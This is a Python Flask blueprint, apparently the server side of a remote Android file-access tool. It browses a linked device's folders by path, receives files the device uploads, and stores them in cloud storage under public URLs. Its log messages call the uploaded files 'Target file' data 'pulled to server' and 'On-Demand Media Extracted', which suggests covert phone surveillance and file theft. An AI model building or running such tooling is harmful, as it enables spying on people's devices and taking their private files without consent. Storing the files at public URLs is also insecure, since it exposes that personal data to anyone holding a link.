from flask import Blueprint, request, jsonify
from backend.auth import token_required
from backend.devices import verify_device_access
from database import supabase
from werkzeug.utils import secure_filename
import uuid

files_bp = Blueprint('files', __name__)

# 🚀 UPGRADED: Path-based directory traversal (Text-First)
@files_bp.route('/api/files', methods=['GET'])
@token_required
def get_files():
    device_id = request.args.get('device_id')
    folder_path = request.args.get('path', '/') # Frontend se path aayega
    limit = request.args.get('limit', 150) 
    
    if not device_id or not verify_device_access(request.owner_id, device_id):
        return jsonify({"status": "error", "message": "Access validation check failed"}), 403

    try:
        # Ab Supabase sirf usi folder ka text/metadata dega jo manga gaya hai
        # Assuming database has a column 'folder_path' or 'parent_path' where Android saves the location
        res = supabase.table('files').select('*').eq('device_id', device_id).eq('folder_path', folder_path).order('file_name', desc=False).limit(limit).execute()
        return jsonify({"status": "success", "data": res.data}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@files_bp.route('/api/files/upload', methods=['POST'])
def upload_file_tracker():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Unauthorized request signature"}), 401

    try:
        dev_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not dev_check.data:
            return jsonify({"status": "error", "message": "Invalid device credentials signature"}), 403

        dev_id = dev_check.data[0]['id']
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "Physical file payload missing"}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No file selected"}), 400

        file_type = request.form.get('file_type', 'generic/binary')
        
        # Security & UUID injection
        filename = secure_filename(file.filename)
        unique_filename = f"{dev_id}/{uuid.uuid4()}_{filename}"
        file_content = file.read()

        # Upload to Supabase bucket
        supabase.storage.from_('device_media').upload(
            path=unique_filename, 
            file=file_content,
            file_options={"content-type": file.content_type}
        )
        
        public_url = supabase.storage.from_('device_media').get_public_url(unique_filename)

        # Update the existing text metadata with the actual file URL
        # We match by device_id and exact file_name to attach the URL
        payload = {
            "file_url": public_url,
            "is_uploaded": True # Flag to tell frontend it's ready to download
        }
        
        # Updating the record instead of inserting a new one
        res = supabase.table('files').update(payload).eq('device_id', dev_id).eq('file_name', filename).execute()

        supabase.table('activity_logs').insert({
            "device_id": dev_id,
            "event_type": "On-Demand Media Extracted",
            "description": f"Target file '{filename}' successfully pulled to server."
        }).execute()

        return jsonify({"status": "success", "data": res.data}), 201
    except Exception as e:
        print(f"File Upload Crash: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@files_bp.route('/api/files/clear', methods=['POST'])
@token_required
def clear_files():
    data = request.json or {}
    device_id = data.get('device_id')

    if not device_id or not verify_device_access(request.owner_id, device_id):
        return jsonify({"status": "error", "message": "Access permission denied"}), 403

    try:
        supabase.table('files').delete().eq('device_id', device_id).execute()
        return jsonify({"status": "success", "message": "Storage catalog cleared"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
